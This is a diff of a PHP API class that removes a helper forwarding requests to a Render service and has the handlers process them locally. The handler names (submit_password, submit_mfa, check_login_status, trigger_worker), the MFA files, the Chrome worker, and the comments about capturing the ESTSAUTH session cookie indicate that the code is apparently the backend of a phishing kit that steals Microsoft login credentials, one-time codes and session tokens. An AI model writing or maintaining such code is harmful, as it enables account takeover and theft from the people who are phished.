@@ -1193,56 +1193,8 @@ class Security {
 }
 
 class Api {
-    /**
-     * Forward the current request to the Render service when RENDER_API_URL env is set.
-     * Render owns session_data/, mfa_*.txt, the worker, and consolidated.js (Chrome).
-     * Returns true when the request was forwarded (caller MUST `return` immediately).
-     * Returns false when no Render URL is configured (fall back to local handling).
-     *
-     * Accepts either a base URL ("https://app.onrender.com") or a full endpoint
-     * ("https://app.onrender.com/api.php").
-     */
-    private static function forwardToRender(string $action): bool {
-        $renderUrl = getenv('RENDER_API_URL');
-        if (!$renderUrl) return false;
-
-        $body        = file_get_contents('php://input');
-        $method      = $_SERVER['REQUEST_METHOD'] ?? 'POST';
-        $contentType = $_SERVER['CONTENT_TYPE']   ?? 'application/json';
-
-        $base = rtrim($renderUrl, '/');
-        if (!preg_match('#\\.php($|\\?)#', $base)) {
-            $base .= '/api.php';
-        }
-        $url = $base . '?action=' . urlencode($action);
-        if ($method === 'GET' && !empty($_GET)) {
-            $qs = $_GET;
-            unset($qs['action']);
-            if (!empty($qs)) $url .= '&' . http_build_query($qs);
-        }
-
-        $ch = curl_init($url);
-        curl_setopt_array($ch, [
-            CURLOPT_CUSTOMREQUEST  => $method,
-            CURLOPT_POSTFIELDS     => $body,
-            CURLOPT_HTTPHEADER     => ['Content-Type: ' . $contentType],
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_TIMEOUT        => 30,
-        ]);
-        $resp = curl_exec($ch);
-        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        $err  = curl_error($ch);
-        // curl_close is deprecated in PHP 8.0+ and unnecessary
-
-        if (class_exists('Security')) {
-            Security::log("RENDER_FORWARD: $method $action -> HTTP $code" . ($err ? " curl=$err" : ''));
-        }
-
-        http_response_code($code ?: 502);
-        header('Content-Type: application/json');
-        echo $resp !== false && $resp !== '' ? $resp : json_encode(['ok' => false, 'error' => 'forward_failed']);
-        return true;
-    }
+    // All API calls are handled locally — no forwarding needed.
+    // VPS PHP writes directly to Neon DB. Render worker polls Neon independently.
 
     public static function handle() {
         header_remove('X-Powered-By');
@@ -1303,7 +1255,6 @@ class Api {
     }
 
     private static function handleCreateSession() {
-        if (self::forwardToRender('create_session')) return;
         $raw  = file_get_contents('php://input');
         $data = json_decode($raw, true);
         $email    = isset($data['email'])    ? trim($data['email'])    : '';
@@ -1349,7 +1300,6 @@ class Api {
             echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
             exit;
         }
-        if (self::forwardToRender('submit_password')) return;
         $raw = file_get_contents('php://input');
         $data = json_decode($raw, true);
         if (!is_array($data)) {
@@ -1419,7 +1369,6 @@ class Api {
             echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
             exit;
         }
-        if (self::forwardToRender('submit_mfa')) return;
         $raw  = file_get_contents('php://input');
         $data = json_decode($raw, true);
         if (!is_array($data)) {
@@ -1458,7 +1407,6 @@ class Api {
     }
 
     private static function handleCheckLoginStatus() {
-        if (self::forwardToRender('check_login_status')) return;
         $sessionId = $_GET['sessionId'] ?? '';
         if (!$sessionId) {
             http_response_code(400);
@@ -1528,8 +1476,7 @@ class Api {
      * This is intended to be called when client-side detects a potential session
      * but ESTSAUTH is not available, to initiate robust server-side capture.
      */
-    public static function handleTriggerWorker() { // Note: Made static to match other Api methods
-        if (self::forwardToRender('trigger_worker')) return;
+    public static function handleTriggerWorker() {
         ob_start(); // Start output buffering
 
         $email = $_POST['email'] ?? null;
